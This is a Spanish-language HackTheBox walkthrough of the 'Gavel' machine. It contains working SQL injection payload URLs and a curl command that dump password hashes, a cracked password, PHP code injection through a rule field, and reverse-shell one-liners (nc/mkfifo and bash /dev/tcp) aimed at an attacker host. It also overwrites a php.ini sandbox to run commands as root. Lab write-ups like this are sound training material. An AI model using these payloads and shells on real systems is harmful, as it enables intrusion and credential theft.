---
hidden: true
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Gavel HackTheBox (Intermediate)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-30 17:26 CET
Nmap scan report for 10.10.11.97
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 1f:de:9d:84:bf:a1:64:be:1f:36:4f:ac:3c:52:15:92 (ECDSA)
|_  256 70:a5:1a:53:df:d1:d0:73:3e:9d:90:ad:c1:aa:b4:19 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://gavel.htb/
Service Info: Host: gavel.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.47 seconds
```

Veremos que hay un puerto `80` que aloja una pagina web la cual nos lleva a un `dominio` llamado `gavel.htb` el cual vamos añadir a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>           gavel.htb
```

Lo guardamos y entraremos directamente desde dicho dominio.

```
URL = http://gavel.htb/
```

Veremos una pagina normal y corriente, en la cual podremos registrar una cuenta y despues iniciar sesion, vamos a registrar una cuenta para ver que vemos con un usuario autenticado.

Una vez iniciado sesion veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Pasted image 20251130175437.png" alt=""><figcaption></figcaption></figure>

Si investigamos un poco, veremos que hay una seccion llamada `Inventory`, si inspeccionamos el codigo del mismo veremos este bloque de aqui.

```html
<!-- En inventory.php -->
<form action="" method="POST" class="form-inline" id="sortForm">
    <input type="hidden" name="user_id" value="5">
    <select name="sort" id="sort" class="form-control form-control-sm mr-2" 
            onchange="document.getElementById('sortForm').submit();">
        <option value="item_name" selected>Name</option>
        <option value="quantity">Quantity</option>
    </select>
</form>
```

Tiene indicios de que puede haber un `IDOR` por el `user_id` o un posible `SQLi` con el tema de ordenar por `Nombre` o `Cantidad`, por lo que vamos abrir `BurpSuite` y capturar la peticion seleccionando ordenar por `quantity` y veremos lo siguiente:

```
POST /inventory.php HTTP/1.1
Host: gavel.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 23
Origin: http://gavel.htb
DNT: 1
Connection: keep-alive
Referer: http://gavel.htb/inventory.php
Cookie: gavel_session=rr314j5kk5sel58uial172f6a6
Upgrade-Insecure-Requests: 1
Priority: u=0, i


user_id=5&sort=quantity
```

Veremos una peticion muy interesante, si probamos a poner en el `user_id` en vez de nuestro `ID` el `1` a ver que vemos...

```
POST /inventory.php HTTP/1.1
Host: gavel.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 23
Origin: http://gavel.htb
DNT: 1
Connection: keep-alive
Referer: http://gavel.htb/inventory.php
Cookie: gavel_session=rr314j5kk5sel58uial172f6a6
Upgrade-Insecure-Requests: 1
Priority: u=0, i


user_id=1&sort=quantity
```

Info:

<figure><img src="../../.gitbook/assets/Pasted image 20251130175755.png" alt=""><figcaption></figcaption></figure>

Veremos que nos esta cargando la pagina del usuario con `ID` numero `1` por el contenido mas que nada, por lo que es muy interesante esto, vamos a seguir investigando por esta via.

## Nuclei

Si investigamos con la herramienta de `nuclei` veremos informacion interesante.

```shell
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
nuclei -u http://gavel.htb -t http/ -o nuclei_scan.txt
```

Info:

```

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.4.10

		projectdiscovery.io

[INF] Your current nuclei-templates  are outdated. Latest is v10.3.4
[INF] Successfully updated nuclei-templates (v10.3.4) to /root/.local/nuclei-templates. GoodLuck!

Nuclei Templates v10.3.4 Changelog
┌───────┬───────┬──────────┬─────────┐
│ TOTAL │ ADDED │ MODIFIED │ REMOVED │
├───────┼───────┼──────────┼─────────┤
│ 12024 │ 12024 │ 0        │ 0       │
└───────┴───────┴──────────┴─────────┘
[WRN] Found 1 template[s] loaded with deprecated paths, update before v3 for continued support.
[INF] Current nuclei version: v3.4.10 (outdated)
[INF] Current nuclei-templates version: v10.3.4 (latest)
[INF] New templates added in latest release: 0
[INF] Templates loaded for current scan: 8442
[INF] Executing 8441 signed templates from projectdiscovery/nuclei-templates
[WRN] Loading 1 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1805 (Reduced 1697 Requests)
[INF] Using Interactsh Server: oast.fun
[cookies-without-secure] [javascript] [info] gavel.htb ["gavel_session"]
[missing-sri] [http] [info] http://gavel.htb ["https://fonts.googleapis.com/css?family=Nunito:300,400,700&display=swap"]
[external-service-interaction] [http] [info] http://gavel.htb
[waf-detect:apachegeneric] [http] [info] http://gavel.htb
[apache-detect] [http] [info] http://gavel.htb ["Apache/2.4.52 (Ubuntu)"]
[http-missing-security-headers:content-security-policy] [http] [info] http://gavel.htb
[http-missing-security-headers:permissions-policy] [http] [info] http://gavel.htb
[http-missing-security-headers:x-frame-options] [http] [info] http://gavel.htb
[http-missing-security-headers:x-content-type-options] [http] [info] http://gavel.htb
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://gavel.htb
[http-missing-security-headers:strict-transport-security] [http] [info] http://gavel.htb
[http-missing-security-headers:referrer-policy] [http] [info] http://gavel.htb
[http-missing-security-headers:clear-site-data] [http] [info] http://gavel.htb
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://gavel.htb
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://gavel.htb
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://gavel.htb
[tech-detect:google-font-api] [http] [info] http://gavel.htb
[tech-detect:font-awesome] [http] [info] http://gavel.htb
[git-config] [http] [medium] http://gavel.htb/.git/config
[INF] Scan completed in 1m. 19 matches found.
```

De toda esta informacion veremos esta ruta interesante:

```
URL = http://gavel.htb/.git/config
```

Vemos que tiene un `.git` y esto nos recuerda a varias vulnerabilidades asociado al mismo, si entramos dentro veremos esto:

```
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[user]
	name = sado
	email = sado@gavel.htb
```

Vemos ya de primeras un nombre de usuario llamado `sado` que es interesante, vamos a realizar un pequeño `fuzzing` por esta via.

### Git-dumper Tool

Vamos a descargarnos una herramienta que sirve para clonarnos un repositorio entero de un `.git` que esta en este caso expuesto en la pagina web, para poderlo investigar mucho mejor:

URL = [GitHub git-dumper](https://github.com/arthaud/git-dumper)

```shell
git clone https://github.com/arthaud/git-dumper.git
cd git-dumper
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
python3 git_dumper.py http://gavel.htb/.git/ gavel_repo
```

Info:

```
...............................<RESTO DE INFO>.....................................
[-] Fetching http://gavel.htb/.git/objects/ff/dc26be661f75d6e8909d474aca5ff1ccebd71f [200]
[-] Fetching http://gavel.htb/.git/objects/ff/f99f302ca5312eb1cca6536d1153171e549fb0 [200]
[-] Fetching http://gavel.htb/.git/objects/fe/04870bc4fc146cd72f8f552cb5e83a43f1eaca [200]
[-] Fetching http://gavel.htb/.git/objects/fe/2ac098b9c6494ed88931df02af0e9eb10819a9 [200]
[-] Fetching http://gavel.htb/.git/objects/fe/7978feee5d11c5aaf7bfa02602ef34130f2379 [200]
[-] Sanitizing .git/config
[-] Running git checkout .
Updated 1849 paths from the index
```

Cuando haya terminado veremos nuestra carpeta `gavel_repo` creada con todo este contenido:

```
drwxr-xr-x root root 4.0 KB Mon Dec  1 11:38:00 2025 .
drwxr-xr-x root root 4.0 KB Mon Dec  1 11:37:50 2025 ..
drwxr-xr-x root root 4.0 KB Mon Dec  1 11:38:00 2025 .git
drwxr-xr-x root root 4.0 KB Mon Dec  1 11:38:00 2025 assets
drwxr-xr-x root root 4.0 KB Mon Dec  1 11:38:00 2025 includes
drwxr-xr-x root root 4.0 KB Mon Dec  1 11:38:00 2025 rules
.rwxr-xr-x root root 8.6 KB Mon Dec  1 11:38:00 2025 admin.php
.rwxr-xr-x root root 8.2 KB Mon Dec  1 11:38:00 2025 bidding.php
.rwxr-xr-x root root  14 KB Mon Dec  1 11:38:00 2025 index.php
.rwxr-xr-x root root 8.2 KB Mon Dec  1 11:38:00 2025 inventory.php
.rwxr-xr-x root root 6.3 KB Mon Dec  1 11:38:00 2025 login.php
.rwxr-xr-x root root 161 B  Mon Dec  1 11:38:00 2025 logout.php
.rwxr-xr-x root root 6.9 KB Mon Dec  1 11:38:00 2025 register.php
```

Si exploramos un poco todo el `.git` veremos que no hay gran cosa, pero como confirmamos anteriormente en el archivo `inventory.php` existe una vulnerabilidad de un `SQLi` por lo que vamos a intentar explotarla de esta forma.

## SQLi (mysql)

Si investigamos bastante y buscamos en internet, en esta pagina da practicamente la clave de como hacerlo adaptado a nuestra maquina.

URL = [SQLi Payload Page](https://slcyber.io/research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements/)

Si nos vamos a la parte de este ejemplo:

```
http://localhost:8000/?name=x` FROM (SELECT table_name AS `'x` from information_schema.tables)y;%23&col=\?%23%00
```

Y lo adaptamos a nuestros parametros...

```
http://gavel.htb/?user_id=x` FROM (SELECT table_name AS `'x` from information_schema.tables)y;%23&sort=\?%23%00--
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-01 182341.png" alt=""><figcaption></figcaption></figure>

Veremos que esta funcionando, nos muestra directamente la informacion de la `DDBB`, es importante añadir el comentario al final del `sort` (`--`).

Ahora que sabemos que funciona, vamos a ver como podemos obtener la tabla de usuarios desde la `URL` directamente, despues de prueba y error podemos obtener la tabla de usuarios de esta forma:

```
URL = http://gavel.htb/inventory.php?user_id=x`+FROM+(SELECT+id+AS+`%27x`+from+users)y;%23&sort=\?%23%00--
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-02 132848.png" alt=""><figcaption></figcaption></figure>

Vemos que de esta forma sacamos los `id` de los usuarios de la tabla, por lo que si probamos a poner `password` o `username` podremos obtener dichos datos, vamos a limpiar todo y concatenar de mejor forma esta informacion con un `curl` desde nuestra terminal.

```shell
curl -s -H 'Cookie: gavel_session=<COOKIE>' 'http://gavel.htb/inventory.php?user_id=x`+FROM+(SELECT+GROUP_CONCAT(username,0x7c,password)+AS+`%27x`+from+users)y;%23&sort=\?%23%00--' | grep -oP "card-title.*?strong>\K.*?<" | tr -d "<" | tr "," "\n"
```

Info:

```
auctioneer|$2y$10$MNkDHV6g16FjW/lAQRpLiuQXN4MVkdMuILn0pLQlC2So9SgH5RTfS
hackerhacker|$2y$10$drCiXGmo7vA0dI2x7ewcy.d9hxgR65wwmNP1z45VRoplfKUwEez8W
daun|$2y$10$7sR1CA7Tc57Czu2qPOigzuYKUs4omZDtyMLoAqQynjR3DucNYL4b2
test|$2y$10$gukgkiumw9rig1rK3O/Zuea9E7yXcwWYhEBXGXB.Ifzkeg/vWqtC6
toto|$2y$10$HfniOr4HgpnXZUMK7IZOM.06/ov5HFdx3wZ1LYlnbVUgz87nhjvXC
anauwu|$2y$10$L5mlf5hGjIUamcsH8rLkTu959N29ha.j3kxI1rU4g12uUaQIQYJpm
simoss|$2y$10$Aieqb9d9kPV5OIUV3sbw2eDH140tlGvO0FDE4hWB0p/UeGtbZ59Y6
meow|$2y$10$DhB2JrVWfe2iAVTpkHR5hemYGGrlLULbUTssoKnT7Y1DALNVNlRCS
aaaaaaaaaaaaaaaaa|$2y$10$YzG/hEV2rrVHwkIWaL1P3.1Gjk5KtDX4Rv7/bxl9bgfHaqISfdt96
diseo|$2y$10$E2uuZ42tiOw/gqwnv9ySL.m8f0Ep2jqTsj4eU0zm70eVtgpGk4wnC
test1234|$2y$10$bOOyOWAeQXsh5sVoq0MQZ.Va6GzxU4iQARa36Pfrxkkt.SYOPdvJS
hacker|$2y$10$RJ0YyEiOxiQIfQwBHatCcu7sfg39b1D.iPQPidcZgjMOpT4qm1oKq
```

Vemos que funciona por lo que obtenemos la informacion completa de la tabla `users`, si probamos a `crackear` el primer usuario el cual creemos que puede ser el que viene por defecto en la `DDBB` veremos lo siguiente:

## Crack password (john)

```shell
john --format=bcrypt --wordlist=<WORDLIST> hash
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
midnight1        (auctioneer)
1g 0:00:00:16 DONE (2025-12-02 13:31) 0.06146g/s 190.2p/s 190.2c/s 190.2C/s iamcool..carpediem
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Vemos que ha funcionado, por lo que vamos a probar dichas credenciales en el `login` de la pagina.

```
User: auctioneer
Pass: midnight1
```

Si entramos dentro con dichas credenciales veremos que hay un apartado de `admin`:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-02 134500.png" alt=""><figcaption></figcaption></figure>

Ahora recordemos que desde el `.git` pudimos obtener el `admin.php`, si lo analizamos veremos esta linea de codigo:

```php
<p class="mb-1 text-justify"><strong>Rule:</strong> <code lang="php"><?= htmlspecialchars($auction['rule']) ?></code></p>
```

Y luego en el formulario:

```php
<input type="text" class="form-control form-control-user" name="rule" placeholder="Edit rule">
```

#### La vulnerabilidad:

El campo `rule` se guarda en la base de datos y luego se muestra dentro de una etiqueta `<code lang="php">`. Si un administrador (auctioneer) puede editar este campo, podría **inyectar código PHP** que se ejecutaría.

Pero hay algo más importante: **¿cómo se usa este campo `rule` en otra parte del código?**

Busquemos la función `get_item_by_name()` y cómo se usa `$auction['rule']`:

```bash
# Buscar usos de 'rule' en el código
grep -r "rule" --include="*.php" /<PATH>/gavel_repo/
```

Esto nos dara informacion respecto a como aprovechar la vulnerabilidad.

Por lo que vemos el archivo `/includes/bid_handler.php` es vulnerable:

```php
$rule = $auction['rule'];
// ...
if (function_exists('ruleCheck')) {
    runkit_function_remove('ruleCheck');
}
runkit_function_add('ruleCheck', '$current_bid, $previous_bid, $bidder', $rule);
// ...
$allowed = ruleCheck($current_bid, $previous_bid, $bidder);
```

## Escalate user auctioneer

### VULNERABILIDAD DE RCE (Remote Code Execution)

El campo `rule` se pasa directamente a **`runkit_function_add()`**, que **crea una función PHP dinámica** con el contenido de `$rule`.

**`runkit_function_add()`** permite crear nuevas funciones PHP en tiempo de ejecución. Si controlamos `$rule`, podemos inyectar código PHP arbitrario.

Vamos a probar a meter un codigo en `rule`:

```php
file_put_contents('/tmp/test_rce', 'RCE worked at ' . date('H:i:s')); return false;
```

Y en el `message` pondremos lo que queremos que se muestre por ejemplo `Sample test`.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-02 141428.png" alt=""><figcaption></figcaption></figure>

Ahora nos iremos a `Bidding`, pujaremos en el recuadro que lleva el `message` `Simple test` con el precio mayor al inicial para que funcione y si todo sale bien, cuando le demos a `Place Bid` se ejecutar el codigo `PHP` y nos mostrara el mensaje de `message`.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-02 141516.png" alt=""><figcaption></figcaption></figure>

Vemos que al pujar se ejecuta el codigo de `PHP` que hemos injectado en la regla.

Por lo que vamos a obtener directamente una `reverse shell`, vamos a meter el siguiente codigo en la parte de `rule`.

```shell
system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f'); return false;
```

En el `message` pondremos lo que queramos, por ejemplo `Shell` y le daremos a guardar cambios, ahora nos iremos a `Bidding` y nos vamos a la `puja` la cual tiene el mensaje `Shell`, antes de darle a `Place Bind` vamos a ponernos a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora si volvemos a la pagina y ponemos una cantidad de monedas superior al precio inicial, le damos al boton de `Place Bind` y volvemos a donde tenemos la escucha, veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [10.10.15.22] from (UNKNOWN) [10.10.11.97] 34918
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

Vemos que ha funcionado, por lo que vamos a `sanitizar` la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Hecho esto veremos en la maquina que hay un usuario llamado `auctioneer`, vamos a probar a reutilizar la contraseña que encontramos en la `DDBB`de esta forma:

```shell
su auctioneer
```

Metemos como contraseña `midnight1`...

```
auctioneer@gavel:~$ whoami
auctioneer
```

Y veremos que seremos dicho usuario, por lo que leeremos la `flag` del usuario.

> user.txt

```
eb3a82ea519ac14e90fc67088d60f44b
```

## Escalate Privileges

Si listamos los grupos que tenemos asociados veremos lo siguiente:

```shell
id
```

Info:

```
uid=1001(auctioneer) gid=1002(auctioneer) groups=1002(auctioneer),1001(gavel-seller)
```

Si realizamos un `find` para ver que archivos estan sujetos al grupo...

```shell
find / -group gavel-seller -type f 2>/dev/null
```

Info:

```
/usr/local/bin/gavel-util
```

Veremos que estara ese binario, si investigamos que hacer veremos lo siguiente:

```
Usage: /usr/local/bin/gavel-util <cmd> [options]
Commands:
  submit <file>           Submit new items (YAML format)
  stats                   Show Auction stats
  invoice                 Request invoice
```

Vemos bastante interesante el echo de que podamos pasarle con `submit` u narchivo de configuracion `YAML` para que lo ejecute y todo esto se hace como `root` por lo que vemos, por lo que si probamos algo basico como esto:

```shell
cat > /tmp/test_root.yaml << 'EOF'
name: testroot
description: test
image: test.jpg
price: 1
rule_msg: test
rule: system('whoami > /opt/gavel/root_test.txt'); system('id > /opt/gavel/id_test.txt'); return false;
EOF

/usr/local/bin/gavel-util submit /tmp/test_root.yaml
```

Nos dara un error de la `sandbox` que bloquea las funciones peligrosas, esto se debe a que el archivo de configuracion de `php.ini` esta filtrando todo esto, por lo que se nos ocurre sobreescribir el archivo con las funciones que tenemos habilitadas para deslimitar la misma y poder ejecutar cualquier comando desde el binario.

> Ruta del archivo: `/opt/gavel/.config/php/php.ini`

```shell
cat > /tmp/simple_modify.yaml << 'EOF'
name: simplemod
description: test
image: test.jpg
price: 1
rule_msg: test
rule: file_put_contents('/opt/gavel/.config/php/php.ini', 'disable_functions = \nopen_basedir = '); return false;
EOF

/usr/local/bin/gavel-util submit /tmp/simple_modify.yaml
```

Info:

```
Item submitted for review in next auction
```

Viendo este mensaje veremos que ha funcionado de forma correcta la sobreescritura, por lo que vamos a probar ahora a ejecutar el anterior comando que nos estaba bloqueando la `sandbox` de la funcion `system()`.

```shell
cat > /tmp/test_root.yaml << 'EOF'
name: testroot
description: test
image: test.jpg
price: 1
rule_msg: test
rule: system('whoami > /opt/gavel/root_test.txt'); system('id > /opt/gavel/id_test.txt'); return false;
EOF

/usr/local/bin/gavel-util submit /tmp/test_root.yaml
```

Info:

```
Item submitted for review in next auction
```

Ahora vemos que ha funcionado de forma correcta, si probamos a ver el archivo que deberia de haber creado...

```shell
cat root_test.txt
```

Info:

```
root
```

Veremos que si lo esta haciendo bien, por lo que ahora vamos a establecer una `shell` directamente autenticada como el usuario `root`, para ello nos pondremos a la escucha en nuestra maquina atacante.

```shell
nc -lvnp <PORT>
```

Ahora desde la maquina victima vamos a crear este archivo de `YAML` para que nos de la `shell` y directamente ejecutarlo.

```shell
cat > /tmp/root_shell.yaml << 'EOF'
name: rootshell
description: test
image: test.jpg
price: 1
rule_msg: test
rule: system('bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"'); return false;
EOF

/usr/local/bin/gavel-util submit /tmp/root_shell.yaml
```

Si volvemos donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7755 ...
connect to [10.10.15.22] from (UNKNOWN) [10.10.11.97] 37004
bash: cannot set terminal process group (932): Inappropriate ioctl for device
bash: no job control in this shell
root@gavel:/# whoami
whoami
root
```

Vemos que ha funcionado, seremos el usuario `root` directamente, por lo que leeremos la `flag` de `root`.

> root.txt

```
3d01b9e27b130e552e94f45f483561d4
```
